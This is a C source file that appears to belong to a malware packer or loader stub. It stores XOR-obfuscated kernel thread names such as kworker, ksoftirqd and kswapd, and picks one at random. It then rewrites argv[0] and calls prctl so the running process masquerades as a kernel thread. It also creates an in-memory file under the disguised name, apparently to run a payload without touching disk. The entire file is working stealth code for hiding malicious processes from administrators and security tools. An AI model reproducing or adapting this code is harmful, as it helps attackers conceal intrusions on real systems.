#include "common.h"

#include <time.h>

#define NAME_OFF_KWORKER     0
#define NAME_LEN_KWORKER    13
#define NAME_OFF_KSOFTIRQD  13
#define NAME_LEN_KSOFTIRQD  13
#define NAME_OFF_MIGRATION  26
#define NAME_LEN_MIGRATION  13
#define NAME_OFF_RCUGP      39
#define NAME_LEN_RCUGP       8
#define NAME_OFF_WATCHDOG   47
#define NAME_LEN_WATCHDOG   12
#define NAME_OFF_KCOMPACTD  59
#define NAME_LEN_KCOMPACTD  12
#define NAME_OFF_KSWAPD     71
#define NAME_LEN_KSWAPD      9
#define NAME_OFF_JOURNAL    80
#define NAME_LEN_JOURNAL    17

/* Dedicated encoded form of the kernel-style identity pool.  stubgen
 * re-keys both this block and the syscall table in every packed output. */
__attribute__((used))
volatile uint8_t g_process_name_xor_key = 0x5A;

__attribute__((used))
volatile uint8_t g_obf_process_names[97] = {
    0x01, 0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B, 0x07,
    0x01, 0x31, 0x29, 0x35, 0x3C, 0x2E, 0x33, 0x28, 0x2B, 0x3E, 0x75, 0x6A, 0x07,
    0x01, 0x37, 0x33, 0x3D, 0x28, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x6A, 0x07,
    0x01, 0x28, 0x39, 0x2F, 0x05, 0x3D, 0x2A, 0x07,
    0x01, 0x2D, 0x3B, 0x2E, 0x39, 0x32, 0x3E, 0x35, 0x3D, 0x75, 0x6A, 0x07,
    0x01, 0x31, 0x39, 0x35, 0x37, 0x2A, 0x3B, 0x39, 0x2E, 0x3E, 0x6A, 0x07,
    0x01, 0x31, 0x29, 0x2D, 0x3B, 0x2A, 0x3E, 0x6A, 0x07,
    0x01, 0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x3E, 0x77, 0x30, 0x35, 0x2F, 0x28,
    0x34, 0x3B, 0x36, 0x07,
};

static const struct {
    size_t offset;
    size_t length;
} process_names[] = {
    { NAME_OFF_KWORKER,    NAME_LEN_KWORKER    },
    { NAME_OFF_KSOFTIRQD,  NAME_LEN_KSOFTIRQD  },
    { NAME_OFF_MIGRATION,  NAME_LEN_MIGRATION  },
    { NAME_OFF_RCUGP,      NAME_LEN_RCUGP      },
    { NAME_OFF_WATCHDOG,   NAME_LEN_WATCHDOG   },
    { NAME_OFF_KCOMPACTD,  NAME_LEN_KCOMPACTD  },
    { NAME_OFF_KSWAPD,     NAME_LEN_KSWAPD     },
    { NAME_OFF_JOURNAL,    NAME_LEN_JOURNAL    },
};

static const char* get_process_name(void) {
    static char decoded[32];
    static int initialized;

    if (!initialized) {
        uint32_t state = (uint32_t)time(NULL) ^
                         (uint32_t)(uintptr_t)&state;
        for (size_t i = 0; i < sizeof(state); ++i)
            state = (state << 5) - state + g_pack_polymorph[i];
        state ^= state << 13;
        state ^= state >> 17;
        state ^= state << 5;

        size_t index = state %
            (sizeof(process_names) / sizeof(process_names[0]));
        size_t length = process_names[index].length;
        uint8_t key = g_process_name_xor_key;
        for (size_t i = 0; i < length; ++i)
            decoded[i] = (char)(g_obf_process_names[
                process_names[index].offset + i] ^ key);
        decoded[length] = '\0';
        initialized = 1;
    }
    return decoded;
}

void hide_process_title(int argc, char* argv[]) {
    const char* name = get_process_name();

    if (argc > 0 && argv && argv[0]) {
        size_t original_length = strlen(argv[0]);
        if (original_length > 0) {
            size_t copy_length = strlen(name);
            if (copy_length >= original_length)
                copy_length = original_length - 1;
            memset(argv[0], 0, original_length);
            memcpy(argv[0], name, copy_length);
        }
    }

    if (syscall3(__NR_prctl, PR_SET_NAME, (long)name, 0) < 0)
        DBG("cannot set kernel process name\n");
}

#ifndef EXEC_DIRECT_ONLY
int create_payload_memfd(const char* argv0) {
    const char* base = get_process_name();
    char name[64];

    (void)argv0;

    size_t len = 0;
    while (base[len] && len < sizeof(name) - 1) {
        name[len] = base[len];
        len++;
    }
    name[len] = '\0';
    return syscall2(__NR_memfd_create, (long)name, MFD_CLOEXEC);
}
#endif
